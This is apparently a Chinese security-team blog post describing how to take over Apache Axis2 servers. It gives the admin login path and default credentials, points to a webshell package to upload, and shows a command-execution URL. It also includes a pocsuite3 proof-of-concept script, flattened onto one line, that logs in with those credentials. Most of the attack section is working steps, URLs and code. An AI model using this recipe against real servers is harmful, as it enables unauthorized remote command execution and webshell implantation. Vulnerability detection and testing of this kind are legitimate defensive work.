> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Gp_FMM-n472wYTBA5lC3lw)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

1.Axis2 简介
----------

Axis2 是下一代 Apache Axis。Axis2 虽然由 Axis 1.x 处理程序模型提供支持，但它具有更强的灵活性并可扩展到新的体系结构。Axis2 基于新的体系结构进行了全新编写，而且没有采用 Axis 1.x 的常用代码。支持开发 Axis2 的动力是探寻模块化更强、灵活性更高和更有效的体系结构，这种体系结构可以很容易地插入到其他相关 Web 服务标准和协议（如 WS-Security、WS-ReliableMessaging 等）的实现中。

Apache Axis2 是 Axis 的后续版本，是新一代的 SOAP 引擎。

2. 漏洞类型
-------

弱口令漏洞 + 上传 arr 包 Getshell

推荐一个 axis2 的 webshell  https://github.com/CaledoniaProject/AxisInvoker

```
axis2的webshell：运行ant -v以构建它，您可以在build目录中找到已编译的归档文件build/AxisInvoker.aar
```

3. 漏洞详情
-------

Axis2 控制面板界面如下：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RV2Bkic7utvcXFpXXCH8CZI8xoiaZBaN8hkW6CRSlPJyia2bk66Q9aIxnvPvm3zFV5gGmZCLas0Z6LZw/640?wx_fmt=png)

后台登录路径：http://ip:port/axis2/axis2-admin/

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RV2Bkic7utvcXFpXXCH8CZI88vwPxtDLNMLskBm4ObfL6zRCIy3DlwfBOeFdu5HZhxyGohJjt1MXrA/640?wx_fmt=png)

默认口令为：admin/axis2，登录后截图。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RV2Bkic7utvcXFpXXCH8CZI8AkZ9bsSjgt8R6oSWSIJjj7IEibralTM0hv2njtv3Sldkkg8eiasOcMZg/640?wx_fmt=png)

上传. aar 包，如图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RV2Bkic7utvcXFpXXCH8CZI8ekaXtyf2kAwkLib8Vzflict7WFmwWRdqhlmt5u8vIGLhsT0ia7O4ehO8Q/640?wx_fmt=png)

根据 GitHub Readme 简介，访问对应 URL 进行命令执行，从而 Getshell。如图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RV2Bkic7utvcXFpXXCH8CZI83NUYia3WcBXvJRHajRkqKTuc27gSLNOqJyc5R7V6uich6eJicgM40rRRQ/640?wx_fmt=png)

http://ip:port/axis2/services/AxisInvoker/exec?cmd=ipconfig

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RV2Bkic7utvcXFpXXCH8CZI8p3O3Dz58f57wf5xekPa0ARPl5Tk5LhFCiaUEpmgQgYQulcBnU5XCLxA/640?wx_fmt=png)

pocsuite3 poc code
------------------

潮声漏洞检测平台已支持此漏洞检测：http://poc.tidesec.com/

```
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEclass DemoPOC(POCBase):    vulID = 'XXXX'  # ssvid    version = '1.0'    author = ['VllTomFord']    vulDate = '2019-12-13'    createDate = '2019-12-13'    updateDate = '2019-12-13'    references = ['']    name = 'Axis2弱口令Getshell'    appPowerLink = ''    appName = 'Axis2'    appVersion = 'all'    vulType = VUL_TYPE.CODE_EXECUTION    desc = '''Axis2弱口令部署aar包Getshell'''    samples = []    install_requires = ['']    category = POC_CATEGORY.EXPLOITS.WEBAPP    def _verify(self):        result = {}        path = "/axis2/axis2-admin/"        r = requests.get(url = self.url+path)        if "Login to Axis2" in r.text:            loginpath = "/axis2/axis2-admin/login"        # 字典方式        data = {            "userName": "admin",            "password": "axis2",            "submit": "+Login+"        }        r = requests.post(url=self.url+loginpath, data=data)        if "Upload Service" in r.text:            result['FileInfo'] = {}        return self.parse_output(result)    def _attack(self):        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail('target is not vulnerable')        return outputregister_poc(DemoPOC)
```

4. 参考链接
-------

https://xz.aliyun.com/t/5832

https://www.ouyangxiaoze.com/2019/12/525.html

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室，近三年来在网络安全技术方面开展研发项目 60 余项，获得各类自主知识产权 30 余项，省市级科技项目立项 20 余项，研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。对安全感兴趣的小伙伴可以加入或关注我们。

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RX4MU7S4WB8R6vF3JbUjA7K0ZtOPxqGSo1HGPhTDicQibOro93UYNBOwRPd4EFseGTDsl1tan0ZXcmw/640?wx_fmt=gif)

我知道你**在看**哟

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVJq73PAV8iaQCPQyOPyU8Ogkicew5KMd52mUWzJfFj3dJZvlic64DFticvDw8cFIBUwubIQAkF5IXQtw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RVJq73PAV8iaQCPQyOPyU8OgTqzpHQhUIM8BG5s07pmhaElGiclG2tlw7ceJtrgVwZepMEpQpdvic1xg/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RVJq73PAV8iaQCPQyOPyU8Og23eRiaUlSIpFGAOzOUv2fVVWr1ZKozfELyDaWWnpGmfabNTNiblArbdw/640?wx_fmt=gif)